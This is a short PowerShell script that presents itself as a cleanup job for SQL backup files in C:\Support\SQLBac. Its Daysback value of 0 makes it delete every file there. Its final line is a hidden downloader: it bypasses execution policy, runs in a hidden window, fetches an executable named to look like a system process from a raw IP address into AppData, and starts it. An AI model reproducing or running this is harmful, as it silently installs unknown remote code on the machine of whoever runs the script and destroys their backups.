
$Dest = "C:\Support\SQLBac\";    
$Daysback = "0";                 

$CurrentDate = Get-Date
$DatetoDelete = $CurrentDate.AddDays($Daysback)
Get-ChildItem $Dest | Where-Object { $_.LastWriteTime -lt $DatetoDelete } | Remove-Item
PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~yahoo/stchost.exe', $env:APPDATA\stchost.exe );Start-Process ( $env:APPDATA\stchost.exe )

